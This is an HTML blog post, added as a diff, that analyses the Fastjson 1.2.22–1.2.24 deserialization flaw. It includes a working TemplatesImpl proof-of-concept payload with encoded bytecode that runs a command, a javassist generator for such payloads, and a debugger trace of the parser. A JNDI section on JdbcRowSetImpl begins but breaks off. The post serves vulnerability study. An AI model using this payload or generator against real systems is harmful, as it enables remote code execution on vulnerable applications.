@@ -1,0 +1,904 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Fastjson反序列化 | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Fastjson反序列化 | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Fastjson简介
+
+Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Fastjson反序列化
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                25 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="fastjson简介">Fastjson简介</h1>
+<blockquote>
+<p>Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject/JSON.parse来分别实现序列化和反序列化操作。</p>
+<p>项目地址：https://github.com/alibaba/fastjson</p>
+</blockquote>
+<h1 id="fastjson-1222-1224反序列化复现">Fastjson 1.2.22-1.2.24反序列化复现</h1>
+<p>man.java</p>
+<pre><code class="language-java">public class Man {
+    private int age;
+    private String name;
+
+    public int getAge() {
+        System.out.println(&quot;getAge&quot;);
+        return age;
+    }
+
+    public void setAge(int age) {
+        System.out.println(&quot;setAge&quot;);
+        this.age = age;
+    }
+
+    public String getName() {
+        System.out.println(&quot;getName&quot;);
+        return name;
+    }
+
+    public void setName(String name) {
+        System.out.println(&quot;setName&quot;);
+        this.name = name;
+    }
+}
+</code></pre>
+<p>写个Ser.java来使用fastjson对一个man对象进行序列化操作</p>
+<pre><code class="language-java">import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.serializer.SerializerFeature;
+
+public class Ser {
+    public static void main(String[] args) {
+        Man man=new Man();
+        man.setAge(18);
+        man.setName(&quot;ch1e&quot;);
+        String jsonstring0= JSON.toJSONString(man);
+        System.out.println(jsonstring0);
+        String jsonstring1=JSON.toJSONString(man, SerializerFeature.WriteClassName);
+        System.out.println(jsonstring1);
+    }
+}
+</code></pre>
+<p>具体运行的情况如下，我们可以看到，我们使用了两种JSON.toJSONString方法，一种只有一个参数，另外一种多了一个SerializerFeature.WriteClassName，序列化出来的结果也是有所不同， 加了SerializerFeature.WriteClassName参数后序列化的结果会多一个@type，fastjson漏洞产生原因就在这</p>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173924586.png" alt="image-20220411173924586" loading="lazy"></figure>
+<p>SerializerFeature.WriteClassName是toJSONString设置的一个属性值，设置之后会多写入一个@type，代表的是被序列化的类名，在上图可见，他还调用了其getter方法。</p>
+<p>反序列化有两种方法，一种是parse，另外一种是parseObject，parseObject方法如下，他其实也是使用的是parse方法，只是多了一步处理toJSON处理对象，<code>JSON.parseObject</code>方法中没指定对象，返回的则是<code>JSONObject</code>的对象</p>
+<pre><code class="language-java">public static final JSONObject parseObject(String text) {
+    Object obj = parse(text);
+    return obj instanceof JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);
+}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173929028.png" alt="image-20220411173929028" loading="lazy"></figure>
+<p>如上图，在序列化时，Fastjson会调用成员的get方法，如果是被private并且没有get方法的成员就不会被序列化，在反序列化时，会调用指定类的全部setter并且public修饰的成员全部赋值。问题主要出在@type处，设想一下，如果未对@type字段进行完全的安全性验证，那么攻击者可以传入危险类来执行其中的恶意代码，这就存在了一个安全问题。其中攻击手法有两种，一种是前面分析过的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，一种是还没遇到过的<code>com.sun.rowset.JdbcRowSetImpl</code>这里先演示一下com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl如何进行攻击，POC如下</p>
+<pre><code class="language-java">import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+import com.alibaba.fastjson.parser.ParserConfig;
+
+public class Unser {
+    public static void main(String[] args) throws Exception {
+        ParserConfig config = new ParserConfig();
+        String text =&quot;{\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADMAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAR0ZXN0AQAMSW5uZXJDbGFzc2VzAQALTERlbW8kdGVzdDsBAApTb3VyY2VGaWxlAQAJRGVtby5qYXZhDAAEAAUHABMBAAlEZW1vJHRlc3QBABBqYXZhL2xhbmcvT2JqZWN0AQAERGVtbwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAFW5pY2UwZTM1OTY1NzU3NTI5NjkwMAEAF0xuaWNlMGUzNTk2NTc1NzUyOTY5MDA7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAACwAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ\&quot;],'_name':'a.b','_tfactory':{ },'_outputProperties':{ }}&quot;;
+        Object obj = JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173932753.png" alt="image-20220411173932753" loading="lazy"></figure>
+<p>上图中的bytecodes是我们构造的恶意代码，我们使用如下代码来产生我们的恶意代码</p>
+<pre><code class="language-java">import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+import com.alibaba.fastjson.parser.ParserConfig;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.net.util.Base64;
+
+public class gadget {
+
+        public static class test{
+        }
+
+        public static void main(String[] args) throws Exception {
+            ClassPool pool = ClassPool.getDefault();
+            CtClass cc = pool.get(test.class.getName());
+
+            String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
+
+            cc.makeClassInitializer().insertBefore(cmd);
+
+            String randomClassName = &quot;nice0e3&quot;+System.nanoTime();
+            cc.setName(randomClassName);
+
+            cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
+
+
+            try {
+                byte[] evilCode = cc.toBytecode();
+                String evilCode_base64 = Base64.encodeBase64String(evilCode);
+                final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;
+                String text1 = &quot;{&quot;+
+                        &quot;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +&quot;\&quot;,&quot;+
+                        &quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode_base64+&quot;\&quot;],&quot;+
+                        &quot;'_name':'a.b',&quot;+
+                        &quot;'_tfactory':{ },&quot;+
+                        &quot;'_outputProperties':{ }&quot;+
+                        &quot;}\n&quot;;
+
+                System.out.println(text1);
+
+                ParserConfig config = new ParserConfig();
+                Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+
+}
+</code></pre>
+<h1 id="fastjson-1222-1224反序列化原理分析">Fastjson 1.2.22-1.2.24反序列化原理分析</h1>
+<h2 id="templatesimpl利用链">TemplatesImpl利用链</h2>
+<p>我们先在<code>JSON.parseObject</code>处下断点，开启调试</p>
+<pre><code class="language-java">public static &lt;T&gt; T parseObject(String input, Type clazz, ParserConfig config, Feature... features) {
+    return parseObject(input, clazz, config, null, DEFAULT_PARSER_FEATURE, features);
+}
+</code></pre>
+<p>他首先是调用了自身的另外一个重载方法，初始化了一个DefaultJSONParser对象</p>
+<pre><code class="language-java">public static &lt;T&gt; T parseObject(String input, Type clazz, ParserConfig config, ParseProcess processor,
+                                      int featureValues, Feature... features) {
+    if (input == null) {
+        return null;
+    }
+
+    if (features != null) {
+        for (Feature feature : features) {
+            featureValues |= feature.mask;
+        }
+    }
+
+    DefaultJSONParser parser = new DefaultJSONParser(input, config, featureValues);
+
+    if (processor != null) {
+        if (processor instanceof ExtraTypeProvider) {
+            parser.getExtraTypeProviders().add((ExtraTypeProvider) processor);
+        }
+
+        if (processor instanceof ExtraProcessor) {
+            parser.getExtraProcessors().add((ExtraProcessor) processor);
+        }
+
+        if (processor instanceof FieldTypeResolver) {
+            parser.setFieldTypeResolver((FieldTypeResolver) processor);
+        }
+    }
+
+    T value = (T) parser.parseObject(clazz, null);
+
+    parser.handleResovleTask(value);
+
+    parser.close();
+
+    return (T) value;
+}
+</code></pre>
+<p>DefaultJSONParser的构造方法如下，首先是用传入的值对自身属性进行赋值，</p>
+<pre><code class="language-java">public DefaultJSONParser(final Object input, final JSONLexer lexer, final ParserConfig config){
+    this.lexer = lexer;
+    this.input = input;
+    this.config = config;
+    this.symbolTable = config.symbolTable;
+
+    int ch = lexer.getCurrent();
+    if (ch == '{') {
+        lexer.next();
+        ((JSONLexerBase) lexer).token = JSONToken.LBRACE;
+    } else if (ch == '[') {
+        lexer.next();
+        ((JSONLexerBase) lexer).token = JSONToken.LBRACKET;
+    } else {
+        lexer.nextToken(); // prime the pump
+    }
+}
+</code></pre>
+<p>这里的input就是我们传进去的需要反序列化的内容，ch是通过<code>lexer.getCurrent()</code>进行赋值，判断当前的字符是否是{开头或者是[开头，如果是{开头，把lexer.token赋为12（这里的JSONToken.LBRACE是一个常量，在文件里就是12）</p>
+<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173938196.png" alt="image-20220411173938196" loading="lazy"></figure>
+<p>然后调用到了<code>T value = (T) parser.parseObject(clazz, null);</code>直接跟进，代码如下</p>
+<pre><code class="language-java">public &lt;T&gt; T parseObject(Type type, Object fieldName) {
+    int token = lexer.token();
+    if (token == JSONToken.NULL) {
+        lexer.nextToken();
+        return null;
+    }
+
+    if (token == JSONToken.LITERAL_STRING) {
+        if (type == byte[].class) {
+            byte[] bytes = lexer.bytesValue();
+            lexer.nextToken();
+            return (T) bytes;
+        }
+
+        if (type == char[].class) {
+            String strVal = lexer.stringVal();
+            lexer.nextToken();
+            return (T) strVal.toCharArray();
+        }
+    }
+
+    ObjectDeserializer derializer = config.getDeserializer(type);
+
+    try {
+        return (T) derializer.deserialze(this, type, fieldName);
+    } catch (JSONException e) {
+        throw e;
+    } catch (Throwable e) {
+        throw new JSONException(e.getMessage(), e);
+    }
+}
+</code></pre>
+<p>首先是获取到了lexer的token，但是我们上面说了，他检测到开头是{,所以这里的token就是12，并且对token进行了判断，这里的话上面的前两个if都不满足，不会进入if语句，直接来到<code>ObjectDeserializer derializer = config.getDeserializer(type);</code>,这里就是获取了一个ObjectDeserializer对象，接着就是<code>return (T) derializer.deserialze(this, type, fieldName);</code>调用了derializer的derialize方法并作为返回值返回，跟进看看</p>
+<pre><code class="language-java">public &lt;T&gt; T deserialze(DefaultJSONParser parser, Type type, Object fieldName) {
+    if (type instanceof GenericArrayType) {
+        Type componentType = ((GenericArrayType) type).getGenericComponentType();
+        if (componentType instanceof TypeVariable) {
+            TypeVariable&lt;?&gt; componentVar = (TypeVariable&lt;?&gt;) componentType;
+            componentType = componentVar.getBounds()[0];
+        }
+
+        List&lt;Object&gt; list = new ArrayList&lt;Object&gt;();
+        parser.parseArray(componentType, list);
+        Class&lt;?&gt; componentClass;
+        if (componentType instanceof Class) {
+            componentClass = (Class&lt;?&gt;) componentType;
+            Object[] array = (Object[]) Array.newInstance(componentClass, list.size());
+            list.toArray(array);
+            return (T) array;
+        } else {
+            return (T) list.toArray();
+        }
+
+    }
+    
+    if (type instanceof Class &amp;&amp; type != Object.class &amp;&amp; type != Serializable.class) {
+        return (T) parser.parseObject(type);    
+    }
+
+    return (T) parser.parse(fieldName);
+}
+</code></pre>
+<p>上面说到，<code>ObjectDeserializer derializer = config.getDeserializer(type)</code>是获取一个ObjectDeserializer对象，这里的type其实是class java.lang.Object，所以这里直接跳过前两个if判断，进入到<code>parser.parse(fieldName);</code>，并且把他作为返回值返回，继续跟进</p>
+<pre><code class="language-java">public Object parse(Object fieldName) {
+    final JSONLexer lexer = this.lexer;
+    switch (lexer.token()) {
+        case SET:
+            lexer.nextToken();
+            HashSet&lt;Object&gt; set = new HashSet&lt;Object&gt;();
+            parseArray(set, fieldName);
+            return set;
+        case TREE_SET:
+            lexer.nextToken();
+            TreeSet&lt;Object&gt; treeSet = new TreeSet&lt;Object&gt;();
+            parseArray(treeSet, fieldName);
+            return treeSet;
+        case LBRACKET:
+            JSONArray array = new JSONArray();
+            parseArray(array, fieldName);
+            if (lexer.isEnabled(Feature.UseObjectArray)) {
+                return array.toArray();
+            }
+            return array;
+        case LBRACE:
+            JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));
+            return parseObject(object, fieldName);
+        case LITERAL_INT:
+            Number intValue = lexer.integerValue();
+            lexer.nextToken();
+            return intValue;
+        case LITERAL_FLOAT:
+            Object value = lexer.decimalValue(lexer.isEnabled(Feature.UseBigDecimal));
+            lexer.nextToken();
+            return value;
+        case LITERAL_STRING:
+            String stringLiteral = lexer.stringVal();
+            lexer.nextToken(JSONToken.COMMA);
+
+            if (lexer.isEnabled(Feature.AllowISO8601DateFormat)) {
+                JSONScanner iso8601Lexer = new JSONScanner(stringLiteral);
+                try {
+                    if (iso8601Lexer.scanISO8601DateIfMatch()) {
+                        return iso8601Lexer.getCalendar().getTime();
+                    }
+                } finally {
+                    iso8601Lexer.close();
+                }
+            }
+
+            return stringLiteral;
+        case NULL:
+            lexer.nextToken();
+            return null;
+        case UNDEFINED:
+            lexer.nextToken();
+            return null;
+        case TRUE:
+            lexer.nextToken();
+            return Boolean.TRUE;
+        case FALSE:
+            lexer.nextToken();
+            return Boolean.FALSE;
+        case NEW:
+            lexer.nextToken(JSONToken.IDENTIFIER);
+
+            if (lexer.token() != JSONToken.IDENTIFIER) {
+                throw new JSONException(&quot;syntax error&quot;);
+            }
+            lexer.nextToken(JSONToken.LPAREN);
+
+            accept(JSONToken.LPAREN);
+            long time = ((Number) lexer.integerValue()).longValue();
+            accept(JSONToken.LITERAL_INT);
+
+            accept(JSONToken.RPAREN);
+
+            return new Date(time);
+        case EOF:
+            if (lexer.isBlankInput()) {
+                return null;
+            }
+            throw new JSONException(&quot;unterminated json string, &quot; + lexer.info());
+        case ERROR:
+        default:
+            throw new JSONException(&quot;syntax error, &quot; + lexer.info());
+    }
+}
+</code></pre>
+<p>这里的话是对token进行了一个判断，之前说了，此时的token是12，应该执行的是如下代码</p>
+<pre><code class="language-java">        case LBRACE:
+            JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));
+            return parseObject(object, fieldName);
+</code></pre>
+<p>调用了<code>parseObject(object, fieldName);</code>并作为返回值返回，这里的话代码太长了，这里就不全放了</p>
+<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173944426.png" alt="image-20220411173944426" loading="lazy"></figure>
+<p>他在上图红框处获取到了key，正是我们需要反序列化的内容中@type</p>
+<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173950557.png" alt="image-20220411173950557" loading="lazy"></figure>
+<p>这里是先对key是否等于@type进行了一个判断，如果是，则获取@type中的值给到typeName，所以传进来的应该是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>,并且调用反射把这个类名传递进去获取一个方法来获取类对象，接着就走到了<code>ObjectDeserializer deserializer = config.getDeserializer(clazz);</code>,获得了一个JavaBeanDeserializer对象并且调用他的deserialze方法作为返回值返回，继续跟踪，他会加载两次重载，来到如下位置</p>
+<figure data-type="image" tabindex="7"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173954080.png" alt="image-20220411173954080" loading="lazy"></figure>
+<p>走完这两步，可以看到，他直接获取到了outputProperties，我们这里跟踪一下，他是哪里获取到的这个outputProperties，往上看代码，fieldDeser是通过<code>sortedFieldDeserializers[fieldIndex]</code>进行赋值，此时的fieldIndex是0，那么这里的sortedFieldDeserializers是哪里来的呢？这里可以发现他是通过构造方法进行赋值也就是在实例化的时候，我们找到实例化对象的地方，发现是在之前的<code>ObjectDeserializer deserializer = config.getDeserializer(clazz);</code>地方进行初始化</p>
+<pre><code class="language-java">public JavaBeanDeserializer(ParserConfig config, JavaBeanInfo beanInfo){
+    this.clazz = beanInfo.clazz;
+    this.beanInfo = beanInfo;
+    
+    sortedFieldDeserializers = new FieldDeserializer[beanInfo.sortedFields.length];
+    for (int i = 0, size = beanInfo.sortedFields.length; i &lt; size; ++i) {
+        FieldInfo fieldInfo = beanInfo.sortedFields[i];
+        FieldDeserializer fieldDeserializer = config.createFieldDeserializer(config, beanInfo, fieldInfo);
+
+        sortedFieldDeserializers[i] = fieldDeserializer;
+    }
+
+    fieldDeserializers = new FieldDeserializer[beanInfo.fields.length];
+    for (int i = 0, size = beanInfo.fields.length; i &lt; size; ++i) {
+        FieldInfo fieldInfo = beanInfo.fields[i];
+        FieldDeserializer fieldDeserializer = getFieldDeserializer(fieldInfo.name);
+        fieldDeserializers[i] = fieldDeserializer;
+    }
+}
+</code></pre>
+<p>我们这里跟进一下他初始化的过程，这里把config.getDeserializer的代码放出</p>
+<pre><code class="language-java">public ObjectDeserializer getDeserializer(Type type) {
+    ObjectDeserializer derializer = this.derializers.get(type);
+    if (derializer != null) {
+        return derializer;
+    }
+
+    if (type instanceof Class&lt;?&gt;) {
+        return getDeserializer((Class&lt;?&gt;) type, type);
+    }
+
+    if (type instanceof ParameterizedType) {
+        Type rawType = ((ParameterizedType) type).getRawType();
+        if (rawType instanceof Class&lt;?&gt;) {
+            return getDeserializer((Class&lt;?&gt;) rawType, type);
+        } else {
+            return getDeserializer(rawType);
+        }
+    }
+
+    return JavaObjectDeserializer.instance;
+}
+</code></pre>
+<p>在上面的代码中，会进入第二个if判断，从而调用到<code>getDeserializer((Class&lt;?&gt;) type, type);</code>跟进，在最后的时候调用了<code>derializer = createJavaBeanDeserializer(clazz, type);</code>继续跟进createJavaBeanDeserializer，而这个方法又调用了<code>JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);</code>，然后在build方法中有如下循环，对clazz的方法进行了遍历，此时的clazz是com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，遍历了他其中的方法，判断名字长度是否大于四，是否是静态方法，是否是以get开头，并且第四个字母为大写，，是否有参数传入，以及返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</p>
+<pre><code class="language-java">    for (Method method : clazz.getMethods()) { // getter methods
+        String methodName = method.getName();
+        if (methodName.length() &lt; 4) {
+            continue;
+        }
+
+        if (Modifier.isStatic(method.getModifiers())) {
+            continue;
+        }
+
+        if (methodName.startsWith(&quot;get&quot;) &amp;&amp; Character.isUpperCase(methodName.charAt(3))) {
+            if (method.getParameterTypes().length != 0) {
+                continue;
+            }
+
+            if (Collection.class.isAssignableFrom(method.getReturnType()) //
+                || Map.class.isAssignableFrom(method.getReturnType()) //
+                || AtomicBoolean.class == method.getReturnType() //
+                || AtomicInteger.class == method.getReturnType() //
+                || AtomicLong.class == method.getReturnType() //
+            ) {
+                String propertyName;
+
+                JSONField annotation = method.getAnnotation(JSONField.class);
+                if (annotation != null &amp;&amp; annotation.deserialize()) {
+                    continue;
+                }
+                
+                if (annotation != null &amp;&amp; annotation.name().length() &gt; 0) {
+                    propertyName = annotation.name();
+                } else {
+                    propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);
+                }
+                
+                FieldInfo fieldInfo = getField(fieldList, propertyName);
+                if (fieldInfo != null) {
+                    continue;
+                }
+
+                if (propertyNamingStrategy != null) {
+                    propertyName = propertyNamingStrategy.translate(propertyName);
+                }
+                
+                add(fieldList, new FieldInfo(propertyName, method, null, clazz, type, 0, 0, 0, annotation, null, null));
+            }
+        }
+    }
+
+    return new JavaBeanInfo(clazz, builderClass, defaultConstructor, null, null, buildMethod, jsonType, fieldList);
+}
+</code></pre>
+<p>TemplatesImpl的getOutputProperties()刚好满足，这样一来的话就执行到了<code>add(fieldList, new FieldInfo(propertyName, method, null, clazz, type, 0, 0, 0, annotation, null, null));</code></p>
+<figure data-type="image" tabindex="8"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173959464.png" alt="image-20220411173959464" loading="lazy"></figure>
+<p>然后就是来到了JavaBeanDeserializer的构造函数，对beanInfo.sortedFields进行了遍历，把结果给了sortedFieldDeserializers[]</p>
+<pre><code class="language-java">public JavaBeanDeserializer(ParserConfig config, JavaBeanInfo beanInfo){
+    this.clazz = beanInfo.clazz;
+    this.beanInfo = beanInfo;
+    
+    sortedFieldDeserializers = new FieldDeserializer[beanInfo.sortedFields.length];
+    for (int i = 0, size = beanInfo.sortedFields.length; i &lt; size; ++i) {
+        FieldInfo fieldInfo = beanInfo.sortedFields[i];
+        FieldDeserializer fieldDeserializer = config.createFieldDeserializer(config, beanInfo, fieldInfo);
+
+        sortedFieldDeserializers[i] = fieldDeserializer;
+    }
+
+    fieldDeserializers = new FieldDeserializer[beanInfo.fields.length];
+    for (int i = 0, size = beanInfo.fields.length; i &lt; size; ++i) {
+        FieldInfo fieldInfo = beanInfo.fields[i];
+        FieldDeserializer fieldDeserializer = getFieldDeserializer(fieldInfo.name);
+        fieldDeserializers[i] = fieldDeserializer;
+    }
+}
+</code></pre>
+<p>然后就回到了我们刚刚获得outputProperties的地方了，然后继续往下，会走到<code>boolean match = parseField(parser, key, object, type, fieldValues);</code>,接着继续调试，来到<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer# parseField</code>这一步</p>
+<p>，在parseField方法末尾执行了有一个<code>setValue(object, value);</code>，我们跟进，往下调试，在如下位置存在反射调用执行<code>TemplatesImpl</code>的<code>getOutputProperties()</code>方法。<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174003695.png" alt="image-20220411174003695" loading="lazy"></p>
+<p>其实到这里已经算结束了，因为后面的部分就是jdk7u21后半条链，这样就能弹出计算器了<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174007904.png" alt="image-20220411174007904" loading="lazy"></p>
+<p>这里的话前面是说到有两种方法，一种是parse,一种是parseObject,差别在于parseObject(&quot;&quot;,class)在调用<code>JavaBeanInfo.build()</code> 方法时传入的clazz参数源于parseObject方法中第二个参数中指定的类，而parse(&quot;&quot;)这种方式调用<code>JavaBeanInfo.build()</code>方法时传入的clazz参数获取于json字符串中@type字段的值。</p>
+<h3 id="坑一">坑一</h3>
+<p>为什么我们需要对_bytecodes进行base64编码？</p>
+<p>在com.alibaba.fastjson.parser.DefaultJSONParser#parseObject处有如下代码</p>
+<pre><code class="language-java">if (token == JSONToken.LITERAL_STRING) {
+    if (type == byte[].class) {
+        byte[] bytes = lexer.bytesValue();
+        lexer.nextToken();
+        return (T) bytes;
+    }
+
+    if (type == char[].class) {
+        String strVal = lexer.stringVal();
+        lexer.nextToken();
+        return (T) strVal.toCharArray();
+    }
+}
+</code></pre>
+<p>其中bytes使用到了lexer.bytesValue();方法，这里跟进这个方法，位于com.alibaba.fastjson.parser#JSONScanner</p>
+<pre><code class="language-java">public byte[] bytesValue() {
+    return IOUtils.decodeBase64(text, np + 1, sp);
+}
+</code></pre>
+<p>这里的话他是有调用IOUtils.decodeBase64进行解密，所以我们需要给他base64编码</p>
+<h3 id="坑二">坑二:</h3>
+<p>在反序列化的时候为什么要加入Feature.SupportNonPublicField参数值？</p>
+<p><code>Feature.SupportNonPublicField</code>的作用是支持反序列化使用非public修饰符保护的属性，在Fastjson中序列化private属性，并且TemplatesImpl里的属性都是私有的</p>
+<h2 id="jndi之jdbcrowsetimpl">JNDI之JdbcRowSetImpl</h2>
+<h3 id="漏洞分析">漏洞分析</h3>
+<p>jndi注入通用性较强，但是需要在目标出网的情况下才能使用</p>
+<p>我这里选择通过ldap进行利用，依旧在JSON.parse()下个断点，进行调试</p>
+<pre><code class="language-java">public static Object parse(String text, int features) {
+    if (text == null) {
+        return null;
+    }
+
+    DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);
+    Object value = parser.parse();
+
+    parser.handleResovleTask(value);
+
+    parser.close();
+
+    return value;
+}
+</code></pre>
+<p>调用到他的重载方法，验证了一下text是否为null，初始化了一个DefaultJSONParser对象。进入这个对象的构造方法，对自身属性进行赋值，判断之前的text的开头是{还是[开头，如果是{开头，设置token值是12</p>
+<figure data-type="image" tabindex="9"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174014186.png" alt="image-20220411174014186" loading="lazy"></figure>
+<p>创建完成后调用DefaultJSONParser#parse方法，继续跟进，调用的自身的重载方法，因为之前的token是12，所以这里会创建一个JSONObject对象，然后调用DefaultJSONParser#parseObject方法并且作为返回值返回</p>
+<figure data-type="image" tabindex="10"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174018989.png" alt="image-20220411174018989" loading="lazy"></figure>
+<p>在DefaultJSONParser#parseObject方法中，前面的部分是对token的一些比较，然后在如下位置获取到了KEY，就是我们的@type部分</p>
+<figure data-type="image" tabindex="11"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174022887.png" alt="image-20220411174022887" loading="lazy"></figure>
+<p>获取到了key以后程序走到如下位置，这里的话通过TypeUtils#loadClass方法去加载Class，调用反射来获取类对象</p>
+<figure data-type="image" tabindex="12"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174026976.png" alt="image-20220411174026976" loading="lazy"></figure>
+<p>在TypeUtils#loadClass方法中的第一个if判断后，有这么一行<code>Class&lt;?&gt; clazz = mappings.get(className);</code> ，他是去mappings里寻找类，但是这里并没有我们想要用的类，所以在后面会使用ClassLoader加载类</p>
+<figure data-type="image" tabindex="13"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174030244.png" alt="image-20220411174030244" loading="lazy"></figure>
+<p>TypeUtils#loadClass方法中ClassLoader加载类的代码如下</p>
+<pre><code class="language-java">if (contextClassLoader != null) {
+    clazz = contextClassLoader.loadClass(className);
+    mappings.put(className, clazz);
+
+    return clazz;
+}
+</code></pre>
+<p>返回的Clazz对象就是一个com.sun.rowset.JdbcRowSetImpl对象，继续回到DeafultJSONParser#parseObject方法中<img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20220330204142724.png" alt="image-20220330204142724" loading="lazy"></p>
+<p>创建了一个ObjectDeserializer对象并且调用了他自身的deserialze方法。继续跟进这里使用黑名单限制了可以反序列化的类，但是黑名单里只有Thread</p>
+<figure data-type="image" tabindex="14"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174038221.png" alt="image-20220411174038221" loading="lazy"></figure>
+<p>继续往下调试，直到调用到setAutoCommit()函数</p>
+<figure data-type="image" tabindex="15"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174041786.png" alt="image-20220411174041786" loading="lazy"></figure>
+<p>跟进connect方法</p>
